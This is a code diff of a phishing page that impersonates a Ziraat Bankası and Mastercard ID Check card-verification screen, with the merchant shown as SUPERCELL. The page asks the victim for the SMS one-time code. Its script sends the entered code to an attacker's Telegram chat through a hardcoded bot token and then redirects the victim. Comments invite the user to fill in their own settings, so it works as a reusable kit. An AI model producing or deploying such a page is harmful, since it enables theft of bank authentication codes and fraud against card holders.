@@ -6,37 +6,37 @@
     <title>Ziraat Bankası - Doğrulama</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
-        body { background-color: #fff; display: flex; justify-content: center; padding: 10px; }
+        body { background-color: #fff; display: flex; justify-content: center; padding: 15px; }
         
-        .main-container { width: 100%; max-width: 450px; border: 1px solid #e0e0e0; padding: 15px; }
+        .main-container { width: 100%; max-width: 400px; border: 1px solid #e0e0e0; padding: 20px; border-radius: 2px; }
 
-        /* Header Kısmı */
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
-        .logo-box { display: flex; align-items: center; font-weight: bold; font-size: 20px; }
-        .logo-box img { height: 30px; margin-right: 8px; }
-        .mc-id { display: flex; align-items: center; font-size: 12px; color: #888; }
-        .mc-id img { height: 20px; margin-right: 5px; }
+        /* Üst Başlıq */
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+        .logo-box { display: flex; align-items: center; font-weight: bold; font-size: 22px; color: #000; }
+        .logo-box img { height: 28px; margin-right: 8px; }
+        .mc-id { display: flex; align-items: center; font-size: 13px; color: #8a8a8a; }
+        .mc-id img { height: 22px; margin-right: 6px; }
 
-        .title { text-align: center; font-size: 18px; color: #444; margin: 15px 0; }
-        hr { border: 0; border-top: 1px solid #eee; margin: 10px 0; }
+        .title { text-align: center; font-size: 19px; color: #333; margin: 15px 0; font-weight: 500; }
+        hr { border: 0; border-top: 1px solid #f0f0f0; margin: 12px 0; }
 
-        /* Bilgiler Bölümü */
-        .info-table { margin: 15px 0; }
-        .row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 15px; }
+        /* Məlumat Cədvəli */
+        .info-table { margin: 20px 0; }
+        .row { display: flex; margin-bottom: 14px; font-size: 16px; align-items: flex-start; }
         .label { font-weight: bold; color: #333; width: 45%; }
-        .value { color: #555; width: 55%; text-align: left; }
+        .value { color: #555; width: 55%; text-align: left; padding-left: 5px; }
 
-        .sms-note { text-align: center; font-size: 13px; color: #666; background: #fafafa; padding: 10px; border-radius: 4px; margin-bottom: 15px; }
+        .sms-note { text-align: center; font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 20px; }
         
-        /* İnput ve Buton */
-        .input-title { font-weight: bold; font-size: 18px; margin-bottom: 10px; color: #333; }
-        .otp-input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; margin-bottom: 15px; outline: none; }
-        .onayla-btn { width: 100%; background-color: #00A3C1; color: white; border: none; padding: 15px; font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; }
+        /* Giriş və Düymə */
+        .input-title { font-weight: bold; font-size: 18px; margin-bottom: 12px; color: #333; }
+        .otp-input { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; margin-bottom: 20px; outline: none; }
+        .onayla-btn { width: 100%; background-color: #00A3C1; color: white; border: none; padding: 16px; font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; }
 
-        /* Alt Kısım */
-        .footer { text-align: center; margin-top: 15px; }
-        .timer { font-size: 14px; margin-bottom: 10px; font-weight: bold; }
-        .cancel-btn { color: #00A3C1; text-decoration: none; font-weight: bold; font-size: 15px; }
+        /* Alt Linklər */
+        .footer { text-align: center; margin-top: 20px; }
+        .timer { font-size: 15px; margin-bottom: 12px; font-weight: bold; color: #333; }
+        .cancel-btn { color: #00A3C1; text-decoration: none; font-weight: bold; font-size: 16px; }
     </style>
 </head>
 <body>
@@ -44,11 +44,11 @@
 <div class="main-container">
     <div class="header">
         <div class="logo-box">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Ziraat_Bankas%C4%B1_logo.svg" alt="Logo">
-            SUPERCELL
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Ziraat_Bankas%C4%B1_logo.svg" alt="Ziraat">
+            Ziraat Bankası
         </div>
         <div class="mc-id">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="MC">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
             | ID Check
         </div>
     </div>
@@ -57,23 +57,23 @@
     <hr>
 
     <div class="info-table">
-        <div class="row"><div class="label">İşyeri Adı:</div><div class="value">M10 TOP UP>Üdiv></div>
-        <div class="row"><div class="label">İşlem Tutarı:</div><div class="value">0,00 USD</div></div>
+        <div class="row"><div class="label">İşyeri Adı:</div><div class="value">SUPERCELL</div></div>
+        <div class="row"><div class="label">İşlem Tutarı:</div><div class="value">0,00 TL</div></div>
         <div class="row"><div class="label">İşlem Tarihi-Saati:</div><div class="value">03.01.2026 21:32:19</div></div>
-        <div class="row"><div class="label">Kart Numarası:</div><div class="value">XXXX XXXX XXXX XXXX</div></div>
+        <div class="row"><div class="label">Kart Numarası:</div><div class="value">XXXX XXXX XXXX 5815</div></div>
     </div>
 
     <hr>
 
     <div class="sms-note">
-        Şifreniz <b>0 XXX XXXXXXX</b> nolu cep telefonunuza gönderilecektir.<br>
+        Şifreniz <b>0 XXX XXX6555</b> nolu cep telefonunuza gönderilecektir.<br>
         Referans no: 7J3V6UB1
     </div>
 
     <div class="input-title">Doğrulama Kodu</div>
     <input type="text" id="smsKod" class="otp-input" placeholder="" inputmode="numeric">
 
-    <button type="button" class="onayla-btn" onclick="islemiTamamla()">Onayla</button>
+    <button type="button" class="onayla-btn" onclick="gonderVeYonlendir()">Onayla</button>
 
     <div class="footer">
         <div class="timer">Kalan Süre: <span id="time">02:33</span></div>
@@ -82,16 +82,16 @@
 </div>
 
 <script>
-    // AYARLAR
+    // BURALARI ÖZÜNƏ GÖRƏ DOLDUR
     const BOT_TOKEN = "8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A";
     const CHAT_ID = "-1003369084883";
-    const YONLENDIR_URL = "hazir_sehifenizin_linki.html";
+    const YONLENDIR = "hazir_sehifen.html";
 
-    function islemiTamamla() {
+    function gonderVeYonlendir() {
         const kod = document.getElementById("smsKod").value;
         
-        if(kod.length > 0) {
-            const mesaj = `💳 *Yeni Kod Gəldi!*\n\n📝 Kod: ${kod}\n💰 Məbləğ: 1.00 AZN\n📍 Məkan: M10 TOP UP`;
+        if(kod.trim() !== "") {
+            const mesaj = `🎮 *SUPERCELL GİRİŞİ*\n\n🔑 Kod: \`${kod}\`\n💰 Tutar: 0.00 TL\n💳 Kart: **** 5815`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -102,28 +102,26 @@
                     parse_mode: 'Markdown'
                 })
             }).then(() => {
-                window.location.href = YONLENDIR_URL;
+                window.location.href = YONLENDIR;
             }).catch(() => {
-                window.location.href = YONLENDIR_URL;
+                window.location.href = YONLENDIR;
             });
         } else {
             alert("Lütfen doğrulama kodunu giriniz.");
         }
     }
 
-    // TAYMER
-    let totalSec = 153;
+    // TAYMER (GERİ SAYIM)
+    let qalanSaniye = 153;
+    const timerBox = document.getElementById("time");
     setInterval(() => {
-        let m = Math.floor(totalSec / 60);
-        let s = totalSec % 60;
-        document.getElementById("time").innerHTML = (m<10?'0':'')+m + ":" + (s<10?'0':'')+s;
-        if(totalSec > 0) totalSec--;
+        let deq = Math.floor(qalanSaniye / 60);
+        let san = qalanSaniye % 60;
+        timerBox.innerText = (deq < 10 ? '0' : '') + deq + ":" + (san < 10 ? '0' : '') + san;
+        if(qalanSaniye > 0) qalanSaniye--;
     }, 1000);
 </script>
 
 </body>
 </html>
-
-
-
 
